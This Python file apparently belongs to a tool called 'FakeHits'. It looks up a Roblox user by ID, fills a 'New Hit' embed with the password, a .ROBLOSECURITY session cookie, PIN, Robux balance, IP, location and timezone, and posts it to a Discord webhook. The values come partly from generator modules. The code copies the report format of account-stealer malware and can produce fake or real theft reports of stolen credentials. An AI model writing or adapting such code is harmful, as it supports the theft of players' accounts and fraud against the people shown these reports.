import requests
from random import randint
from FakeHits.gen.numbers import Network
from FakeHits.gen.roblox import Roblox

 

class main:
    def __init__(self,webhook,id,password) -> None:
        
        self.webhook = webhook
        self.id = id 
        self.password = password
        self.webhooksend(id)
        print("reached 2nd init")
        
    def webhooksend(self,id):
        username,headshot,rap,friends,followers,following = Roblox.check_user(id)
        ip,c,timez = Network.network('v')
        rcookie,pin,nrobux,nprobux = Network.roblox('v')   
        print("reached 3rd init")
        json = {
            "content": "",
            "embeds": [
                {
                    "title": f"New Hit",
                    "color": randint(0000000,9999999),
                    "fields": [
                        {
                            "name": "Username",
                            "value": f"{username}",
                            "inline": True
                        },
                        {
                            "name": "Robux (Robux Pending)",
                            "value": f"{nrobux} ({nprobux})",
                            "inline": True
                        },
                        {
                            "name": "Password",
                            "value": f"{self.password}",
                            "inline": True
                        },
                        {
                            "name": "UserID",
                            "value": f"{id}",
                            "inline": True
                        },
                        {
                            "name": "Rap",
                            "value": f"{rap}",
                            "inline": True
                        },
                        {
                            "name": "Group Owned | Funds",
                            "value": "0 | 0",
                            "inline": True
                        },
                        {
                            "name": "Premium",
                            "value": "True",
                            "inline": True
                        },
                        {
                            "name": "Pin",
                            "value": f"{pin}",
                            "inline": True
                        },
                        {
                            "name": "Email (2FA)",
                            "value": "True",
                            "inline": True
                        },
                        {
                            "name": "Freinds",
                            "value": f"{friends}",
                            "inline": True
                        },
                        {
                            "name": "Followers",
                            "value": f"{followers}",
                            "inline": True
                        },
                        {
                            "name": "Following",
                            "value": f"{following}",
                            "inline": True
                        },
                        {
                            "name": "IP",
                            "value": f"{ip}",
                            "inline": True
                        },
                        {
                            "name": "Location",
                            "value": f"{c}",
                            "inline": True
                        },
                        {
                            "name": "Timezone",
                            "value": f"{timez}",
                            "inline": True
                        },
                        {
                            "name": ".ROBLOSECURITY",
                            "value": f"```fix\n{rcookie}\n```"
                        }
                    ],
                    "footer": {
                        "text": f"made by scooby"
                    },
                    "thumbnail": {
                        "url": f"{headshot}"
                    }
                }
            ]
        }
        print("finishing up")
        try:
            requests.post(self.webhook,json=json)
            return 'Posted'
        except:
            return 'Error'
        
        
        
        